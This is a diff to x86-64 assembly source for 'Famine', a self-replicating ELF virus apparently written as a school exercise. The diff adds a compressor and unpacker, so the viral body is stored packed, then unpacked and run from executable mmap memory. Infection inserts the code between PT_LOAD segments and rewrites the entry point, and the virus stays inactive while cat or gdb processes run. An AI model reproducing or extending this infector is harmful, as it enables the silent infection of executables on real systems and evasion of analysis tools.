@@ -17,6 +17,12 @@ section.text:
 ; function parameters are always (rdi, rsi, rdx, rcx, r8, r9) in this specific order
 ; (make sense with syscall)
 
+_params:
+	length dq 0x0
+	vaddr dq 0x0
+	entry_inject dq 0x0
+	entry_prg dq 0x0
+
 _start:
 	call _inject; push addr to stack
 %ifdef DEBUG; ==================================================================
@@ -25,6 +31,7 @@ _start:
 newline db `\n`, 0x0
 
 _print:; (string rdi)
+	push r11
 	push rdx
 	push rsi
 
@@ -50,32 +57,216 @@ _print:; (string rdi)
 
 	pop rsi
 	pop rdx
+	pop r11
 ret
 
 %endif; ========================================================================
 
-_inject:
-	; check for process running
-	lea rdi, [rel process_dir]
-	push 1
-	pop rsi ; mode for move_through_dir
+signature db `Famine version 1.0 (c)oded by lmartin`, 0x0; sw4g signature
 
-	call _move_through_dir
+_inject:
 	pop r8; pop addr from stack
 	sub r8, 0x5; sub call instr
-
-	cmp rax, 0x0
-	jne _end
-
-	; save register
+	; r8 contains the entry of the virus
+; = DEBUG
+;			mov rdi, r8
+;			mov rax, 11
+;			syscall
+; =
 
 	%ifdef DEBUG
 		mov rdi, r8
-		add rdi, 0x5
+		add rdi, 0x5; sub call instr
 		call _print; _print(rdi)
 	%endif
-	; r8 contains the entry of the virus
 
+	; copy the prg in memory and launch it
+	xor rax, rax; = 0
+	cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
+	jne .infected
+
+	; host part
+	call _search_dir
+	jmp _end
+
+	.infected:
+		push rdx
+
+		push r8
+		; copy the virus into a mmap executable
+		xor rdi, rdi; NULL
+
+		lea rsi, [rel _eof]
+		lea r8, [rel _params]
+		sub rsi, r8
+		push 7
+		pop rdx; PROT_READ | PROT_WRITE | PROT_EXEC
+		push 34
+		pop r10; MAP_PRIVATE | MAP_ANON
+		push -1
+		pop r8 ; fd
+		xor r9, r9; offset
+		push 9
+		pop rax; mmap
+		syscall
+
+		push rsi; save length
+; ==
+;		memcpy(void *dst, void *src, size_t len)
+		push rax
+		pop rdi ; addr
+		lea rsi, [rel _params]
+		lea rdx, [rel _packed_part]
+		sub rdx, rsi
+		call _ft_memcpy
+; ==
+		mov r9, rdi; save addr
+;		unpack(void *dst, void *src, size_t len)
+		add rdi, rdx
+		add rsi, rdx
+		mov rax, [rel length]
+		sub rax, rdx; length - [packed_part - params]
+		push rax
+		pop rdx
+
+		call _unpack
+
+		push r9
+		pop rdi
+		pop rsi
+
+		pop r8
+
+		push rsi ; save length
+
+		lea rsi, [rel _params]
+		lea rax, [rel _search_dir]
+		sub rax, rsi
+		add rax, rdi
+
+		push rdi ; save addr
+
+		call rax ; jump to mmaped memory
+
+		pop rdi ; pop addr
+		pop rsi ; pop length
+
+		; munmap the previous exec
+		push 11
+		pop rax
+		syscall
+		pop rdx
+
+		jmp _end
+
+;                 v dst      v src       v size
+_unpack:; (void *rdi, void *rsi, size_t rdx)
+	push r8
+	push r9
+	push r10
+	push r11
+	push rcx
+
+	push rdi
+	pop r9
+	push rsi
+	pop r10
+	push rdx
+	pop r11
+
+	xor rcx, rcx; i
+	xor r8, r8; j
+	.loop_uncompress:
+		xor rax, rax
+		cmp rcx, r11
+		jge .end_loop
+		cmp byte[r10 + rcx], 244
+		je .uncompress_char
+			mov al, [r10 + rcx]
+			mov [r9 + r8], al
+			inc rcx
+			inc r8
+		jmp .loop_uncompress
+		.uncompress_char:
+; == Seems to works
+			inc rcx
+			mov rdi, r9
+			add rdi, r8
+			mov al, [r10 + rcx]
+			mov rsi, rdi
+			sub rsi, rax
+			inc rcx
+			mov al, [r10 + rcx]
+			mov rdx, rax
+			call _ft_memcpy
+			xor rax, rax
+			mov al, byte[r10 + rcx]
+			add r8, rax
+			inc rcx
+; ==
+		jmp .loop_uncompress
+	.end_loop:
+		push r9
+		pop rdi
+		push r10
+		pop rsi
+		push r11
+		pop rdx
+
+	pop rcx
+	pop r11
+	pop r10
+	pop r9
+	pop r8
+ret
+
+_ft_memcpy: ; (string rdi, string rsi, size_t rdx)
+	push rcx
+
+	xor rax, rax
+	xor rcx, rcx
+	.loop_byte:
+		cmp rcx, rdx
+		je .return
+		mov al, [rsi + rcx]
+		mov [rdi + rcx], al
+		inc rcx
+	jmp .loop_byte
+	.return:
+		mov rax, rdi
+
+	pop rcx
+ret
+
+_end:
+	xor rax, rax; = 0
+	cmp rax, [rel entry_inject]; if entry_inject is set we are in host
+	je _end_host
+
+	; infected file
+	push r8
+	pop rax
+
+	sub rax, [rel entry_inject]
+	add rax, [rel vaddr]
+
+	add rax, [rel entry_prg]
+	sub rax, [rel vaddr]
+
+	jmp rax
+
+; ============================================================== pack from there
+_packed_part:
+_search_dir:
+	; check for process running
+	push 1
+	pop rsi ; mode for move_through_dir
+	lea rdi, [rel process_dir]
+
+	call _move_through_dir
+
+	cmp rax, 0x0
+	jne .return
 	xor rsi, rsi ; mode for move_through_dir
 	lea rdi, [rel directories]
 	xor rcx, rcx; = 0
@@ -88,28 +279,8 @@ _inject:
 	inc rcx
 	cmp byte[rdi + rcx], 0x0
 	jnz .loop_array_string
-
-_end:
-	xor rax, rax; = 0
-	cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
-	jne .infected
-
-	push 60
-	pop rax ; exit
-	xor rdi, rdi; = 0
-	syscall
-
-	.infected:
-		push r8
-		pop rax
-
-		sub rax, [rel entry_inject]
-		add rax, [rel vaddr]
-
-		add rax, [rel entry_prg]
-		sub rax, [rel vaddr]
-
-		jmp rax
+	.return:
+ret
 
 _move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
 	push r10
@@ -389,24 +560,64 @@ _infect_file: ; (string rdi, stat rsi)
 
 			; check size needed
 			sub rdi, r13
+			mov rdi, [rbx + 8]
 			add rdi, rsi; p_offset + p_filesz
 			mov rsi, [rbx + 56 + 8] ; next->p_offset
 			sub rsi, rdi
+
+			add rdi, 8 * 4 ; let space for params
+
+			; host
 			lea rdx, [rel _eof]
-			lea r9, [rel _start]
+			lea r9, [rel _params]
 			sub rdx, r9
 			cmp rsi, rdx
 			jl .unmap ; if size between PT_LOAD isn't enough -> abort
-			; TODO: maybe infect via PT_NOTE ?
 
-			; copy virus
-			sub rdx, 8 * 3
+			xor r9, r9
+			cmp r9, [rel entry_inject]
+			jne .infected
+
+			; ==		copy start of the virus
 			add rdi, r13 ; addr pointer -> mmap
-			mov rsi, r8
+			mov rax, rdi
+			push rax; save
+
+			lea rsi, [rel _start]
+			lea rdx, [rel _packed_part]
+			sub rdx, rsi
 			call _ft_memcpy
 
+			; ==		pack a part
+			add rdi, rdx
+			call _pack
+			push rax
+			pop r9
+
+			; ==		change rdx, rax, rdi
+			add rdx, r9
+			pop rdi; mmap
+			mov rax, rdi
+
+			jmp .params
+
+			.infected:
+			; TODO: CA NE MARCHERA JAAAMMAAAIIISS
+			mov rdx, [rel length]
+			sub rdx, 8 * 4
+			; copy virus
+			add rdi, r13 ; addr pointer -> mmap
+			add rdi, 8 * 4
+			mov rsi, r8
+			call _ft_memcpy
+			mov rax, rdi
+
+			.params:
 			; add _params
-			add rax, rdx ; go to the end
+			sub rax, 8 * 4
+			add rdx, 8 * 4
+			mov [rax], rdx ; length
+			add rax, 8
 			mov rsi, [rbx + 16]
 			mov [rax], rsi ; vaddr
 			add rax, 8
@@ -427,17 +638,18 @@ _infect_file: ; (string rdi, stat rsi)
 			mov [r13 + 24], rdi ; new_entry
 
 			; change pt_load size
-			add rdx, 8 * 3
 			add [rbx + 32], rdx; p_filesz + virus
 			add [rbx + 40], rdx; p_memsz + virus
 
 			; write everything in file
 			mov rdi, r11
+			push r11
 			mov rsi, r13
 			mov rdx, [r12 + 48]
 			push 1
 			pop rax
 			syscall
+			pop r11
 	.unmap:
 		push r11; munmap using r11 ?
 		push r13
@@ -544,6 +756,7 @@ _check_file_process:; (string rdi)
 	pop r8
 ret
 
+
 ; ================================ utils =======================================
 
 _ft_concat_path: ;(string rdi, string rsi) -> rdi is dest, must be in stack or mmaped region
@@ -617,6 +830,8 @@ _ft_memmem: ; (void *rdi, size_t rsi, void *rdx, size_t rcx)
 	xor rax,rax
 	xor r8, r8
 	sub rsi, rcx
+	cmp rsi, 0x0
+	jl .return
 	cmp rcx, 0x0
 	je .return
 	.loop_byte:
@@ -653,24 +868,6 @@ _ft_memmem: ; (void *rdi, size_t rsi, void *rdx, size_t rcx)
 	pop rbx
 	pop r9
 	pop r8
-ret
-
-_ft_memcpy: ; (string rdi, string rsi, size_t rdx)
-	push rcx
-
-	xor rax, rax
-	xor rcx, rcx
-	.loop_byte:
-		cmp rcx, rdx
-		je .return
-		mov al, [rsi + rcx]
-		mov [rdi + rcx], al
-		inc rcx
-	jmp .loop_byte
-	.return:
-		mov rax, rdi
-
-	pop rcx
 ret
 
 _ft_strcmp: ; (string rdi, string rsi)
@@ -716,11 +913,6 @@ _ft_strcpy: ; (string rdi, string rsi)
 ret
 
 ; ==============================================================================
-
-process_dir db `/proc`, 0x0
-process_status db `status`, 0x0
-process db `\tcat\n`, 0x0, `\tgdb\n`, 0x0, 0x0
-
 ;                   E     L    F   |  v ELFCLASS64
 elf_magic db 0x7f, 0x45, 0x4c, 0x46, 0x2, 0x0
 %ifdef FSOCIETY
@@ -730,11 +922,120 @@ elf_magic db 0x7f, 0x45, 0x4c, 0x46, 0x2, 0x0
 	directories db `/tmp/test`, 0x0, `/tmp/test2`, 0x0, 0x0
 	dotdir db `.`, 0x0, `..`, 0x0, 0x0
 %endif
-signature db `Famine version 1.0 (c)oded by lmartin`, 0x0; sw4g signature
 
-_params:
-	vaddr dq 0x0
-	entry_inject dq 0x0
-	entry_prg dq 0x0
+	process_dir db `/proc`, 0x0
+	process_status db `status`, 0x0
+	process db `\tcat\n`, 0x0, `\tgdb\n`, 0x0, 0x0
 
+; ===================================================================end of pack
+_end_of_pack:
 _eof:
+
+; don't need to copy the host part
+; v
+
+_end_host:
+	push 60
+	pop rax ; exit
+	xor rdi, rdi; = 0
+	syscall
+
+; == TODO: Don't know if this works
+;               v dest
+_pack: ;(void *rdi) -> ret size + fill rdi
+	push r8
+	push r10
+	push r11
+	push r12
+	push rbx
+	push rcx
+	push rdx
+	push rsi
+
+	lea rdx, [rel _end_of_pack]
+	lea r10, [rel _packed_part] ; dictionary = addr
+	mov r11, r10; buffer = addr
+	sub rdx, r10; size
+
+	xor rcx, rcx; i = 0
+	xor r8, r8; l = 0
+	.loop_compress:
+		cmp rcx, rdx; while (i < size) {
+		jge .end_compress
+		mov rsi, r10
+		sub rsi, r11; len = dictionary - buffer
+		cmp rsi, 255; if (len > 255) {
+		jle .continue
+		add r11, rsi
+		sub r11, 255; buffer += len - 255
+		mov rsi, r10
+		sub rsi, r11; len = dictionary - buffer
+		.continue: ; }
+		push 1
+		pop rbx; k = 1
+		xor r12, r12; prev_ret = 0
+		.loop_memmem:; while
+			cmp rbx, 255
+			jge .end_memmem; (k < 255
+			mov rax, rbx
+			add rax, rcx
+			cmp rax, rdx; && i + k < size)
+			jge .end_memmem
+			push rdi
+			push rdx
+			push rcx
+			mov rdi, r11
+			mov rdx, r10
+			mov rcx, rbx
+			call _ft_memmem; ret = ft_memmem(buffer, len, dictionary, k)
+			pop rcx
+			pop rdx
+			pop rdi
+			cmp rax, 0x0; if (!ret) break
+			je .end_memmem
+			push rax
+			pop r12; prev_ret = ret
+			inc rbx; k++
+		jmp .loop_memmem
+		.end_memmem:; }
+		dec rbx; k--
+		cmp r12, 0x0; if (prev_ret
+		je .not_compress_char
+		cmp rbx, 4; && k >= 4) {
+		jl .not_compress_char
+		mov byte[rdi + r8], 244; addr[l] = 244
+		inc r8; l++
+		mov rax, r10
+		sub rax, r12
+		mov byte[rdi + r8], al; addr[l] = dictionary - prev_ret
+; == TODO: test
+		inc r8; l++
+		mov rax, rbx
+		mov byte[rdi + r8], al; addr[l] = k
+; == TODO: test
+		inc r8; l++
+		jmp .next_loop; }
+		.not_compress_char:; else {
+		push 1
+		pop rbx; k = 1
+		mov al, [r10]
+		mov byte[rdi + r8], al; addr[l] = *dictionary
+		inc r8; l++
+	.next_loop:; }
+		add r10, rbx; dictionary += k
+		add rcx, rbx; i += k
+		jmp .loop_compress
+	.end_compress: ; }
+		push r8
+		pop rax
+
+	pop rsi
+	pop rdx
+	pop rcx
+	pop rbx
+	pop r12
+	pop r11
+	pop r10
+	pop r8
+ret
+; ==
